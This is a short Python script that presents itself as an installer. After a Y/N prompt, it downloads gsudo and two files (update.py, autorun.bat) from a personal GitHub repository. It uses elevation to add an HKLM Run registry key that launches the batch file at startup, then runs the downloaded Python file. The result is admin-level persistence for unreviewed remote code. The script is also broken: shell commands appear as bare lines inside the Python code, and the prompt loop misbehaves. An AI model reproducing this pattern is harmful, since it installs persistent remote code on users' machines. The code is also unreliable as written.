import os
import requests
import winshell
from win32com.client import Dispatch
def install():
	os.mkdir("c:/julinjutut")
	url = 'https://github.com/gerardog/gsudo/releases/download/v2.0.4/gsudo.v2.0.4.zip'
	r = requests.get(url, allow_redirects=True)
	open('c:/julinjutut/sudo.zip', 'wb').write(r.content)
	tar -xf sudo.zip
	url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/update.py'
	r = requests.get(url, allow_redirects=True)
	open('c:/julinjutut/update.py', 'wb').write(r.content)
	url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/autorun.bat'
	r = requests.get(url, allow_redirects=True)
	open('c:/julinjutut/autorun.bat', 'wb').write(r.content)
	c:/julinjutut/x86/gsudo.exe REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Julinjutut" /t REG_SZ /F /D "C:\julinjutut\autorun.bat"
	os.system("python3 c:/julinjutut/update.py")
def start():
	shure = input("Are you shure you want to install? [Y/N] ")
	if shure == "N":
		exit()
	if shure == "Y":
		print("Installing")
		install()
	print("Invalid")
	start()
start()
